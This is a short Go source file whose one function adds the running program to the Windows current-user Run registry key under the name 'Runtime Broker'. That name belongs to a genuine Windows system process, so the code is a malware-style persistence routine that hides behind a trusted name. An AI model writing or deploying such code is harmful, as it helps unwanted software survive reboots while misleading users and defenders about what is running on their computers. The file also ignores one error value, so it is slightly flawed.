package main

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

const StartupKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

func addToStartup() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, StartupKey, registry.SET_VALUE)
	if err != nil {
		panic(err)
	}
	defer k.Close()

	exePath, err := os.Executable()
	if err := k.SetStringValue("Runtime Broker", exePath); err != nil {
		panic(err)
	}
	return nil
}
